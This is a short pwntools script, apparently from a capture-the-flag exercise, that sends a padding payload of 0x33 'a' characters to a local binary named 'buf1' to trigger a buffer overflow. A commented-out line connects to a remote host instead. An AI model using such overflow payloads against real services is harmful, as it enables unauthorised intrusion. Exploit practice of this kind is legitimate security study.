from pwn import *

host, port = "34.80.245.238", 33333
# a = remote(host, port)
a = process('./buf1')
raw_input('debug')

payload = 'a'*0x33
a.sendline(payload)

a.interactive()